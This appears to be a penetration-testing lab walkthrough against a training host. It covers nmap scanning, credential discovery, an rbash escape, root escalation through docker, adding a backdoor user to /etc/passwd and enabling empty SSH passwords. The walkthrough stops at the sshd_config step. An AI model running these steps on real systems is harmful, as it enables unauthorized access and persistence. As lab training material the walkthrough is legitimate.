Getting a Foothold

Getting a Foothold

# 1. NMAP scans
TCP Connect scan with service detection on all ports
`sudo nmap -sV -sT -p- 10.11.1.101`
![ac80508623ea4429d742df9080ba0795.png](2f6c8093fba747ccbd2c5f8b26936823.png)

Aggressive no ping scan on all ports with service detection, running scripts for default, save, auth, vuln
`sudo nmap -Pn -A -p- -sV --script default,safe,auth,vuln --max-retries 4 10.11.1.101`
Of interest is finding the /passwords/ directory
![272e22311799543119917c255dcf6ab1.png](edc28939c29748eca7d95e3849e82b05.png)
The /passwords directory is also listed in robots.txt
![8bc0fcfd70ef5b36b85d1d434f028777.png](28bef1c26c40449abfd4391eeb6af846.png)


# 2. Browse to the /passwords directory
[http://10.11.1.101/passwords/](http://10.11.1.101/passwords/)

There are some usernames
![e07c31030d75f06149ecdfcfd8f9aaf4.png](4a5ee4c67e084b4a8e5bca0bcac54966.png)

Let's click on the first one (alfred-pas.html). We see that it is an EveryPass login page. Let's look for a password on the landing page
[http://10.11.1.101/passwords/alfred-pas.html](http://10.11.1.101/passwords/alfred-pas.html)
![8567b8e8201ffce4ab6545321fe09f7a.png](46f854c822e442dabc75bdcfc9a57be2.png)


# 3. Manually browse the website
###  The landing page indicates the site is up, and that **'you can grab passwords from the usual place'**
[http://10.11.1.101](http://10.11.1.101)
![landing_10.11.1.101.png](6d9f3c6200144db9b014b5c72a69b06b.png)

### The contact page
[http://10.11.1.101/contactus.html](http://10.11.1.101/contactus.html)
We get the years of birth for:
Administrator	= Walter 1982
Developer		= Alfred 1988
Web Developer	= Cory 1985
Writer			= Jasmine 1983			
![contact_us.png](ea2589a928fe445ea450762b6fabfe85.png)


# 4. Log in to EveryPass as Alfred
Alfred's log in page
[http://10.11.1.101/passwords/alfred-pas.html](http://10.11.1.101/passwords/alfred-pas.html)
![8567b8e8201ffce4ab6545321fe09f7a.png](46f854c822e442dabc75bdcfc9a57be2.png)

Let's use the birth year (1988) for Alfred indicated from the contact page
![a3abf9f9e90f200d723a9e16714488c5.png](797e470c8fce41c8810315f114070fc4.png)

There is some info for SSH server access
alfred:IHopeThisDoesNotExpire
![2c9efaffa7c336b1788a255b857d3b77.png](863dcbb2e3c14e8d91c63d4037dd098e.png)


# 5. SSH as alfred:IHopeThisDoesNotExpire
`ssh alfred@10.11.1.101`
Password: `IHopeThisDoesNotExpire`
![236a98abbfece3abd1e80ce65929001d.png](4453bff5dc7d4d1997bc2bdc69a1553a.png)

We get dropped into rbash (restricted shell)
`echo $SHELL`
![3f82c5df603afd568e827c2dd207d7cf.png](eaa38230172f4845ba93f374decd80b9.png)

Look at the PATH variable
`echo $PATH`
![f25976484fdafd7ebb7cd21816edfabb.png](73d3df920f2b4f31a7b9118e2ced5c98.png)

Exit SSH then login again using no profile instead
`exit`
`ssh alfred@10.11.1.101 -t "bash --noprofile"`
Password: `IHopeThisDoesNotExpire`
![f00748aaae1b5611486b054d3b93c1a2.png](6905b0d77aeb4d65a952d5be67232c74.png)

We still have a restricted shell
`echo $SHELL`
![6bc7b67b7b11ad9d38ecb6c23f74379c.png](5fd5179af7f343e18c74da323aac3dc2.png)

But now we have a new path
`echo #PATH`
![b876d7c2bc7e06dfb944da89a79acaf3.png](c6fb66f6574649e0a0c992794f0c4336.png)

Look what's in alfred's home directory. We should be in his home directory already.
`ls`
![eb093d3a595469c900aee984ecb58303.png](168d5882c0404a2baa211bfd6ad8b244.png)

Read the README.txt. There is interesting text **Cory insists on using Docker**
`cat README.txt`
![41536321074a950e622cafecf58bb8e7.png](b95ee5e653f2407b8664ed3e57d9ddcd.png)

Find the location of docker
`which docker`
![6f3cc74a67b928aafb681e1efd03998f.png](a70445d421684f279260fa5de951de22.png)

View the permissions. Everybody can execute this as root!
`ls -la /usr/bin/docker`
![dd8e6fe28bf670f4205728dcd28685ad.png](d9259d2ea2484fcbbeddcb6122a66f9d.png)

Use docker to elevate privilege to root
`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
![809df9f061c0f3927443a9c27b8abc87.png](17ea702b160241cd8bb7299f47f80439.png)

# Does not work!
Let's add a new user. Let's call all 'newuser'
`vi /etc/passwd`
Copy the first line, and paste it to the bottom. Label it newuser with password abc
![250b3cd586a3f4914b9ea7da4bf62e0b.png](6db2eaacc6f94706a0caba12d53a9f4a.png)

`exit`
![ff41fc8566aaef97695e511c792d47b9.png](7e3acc4cdc3e4ca2a1d1f377b6961101.png)



Permit empty passwords
`vi /etc/ssh/sshd_config`
![36ee7de8f1322872619622cef772eb16.png](ef31c664cb2d468cabf9c8c7315d865a.png)






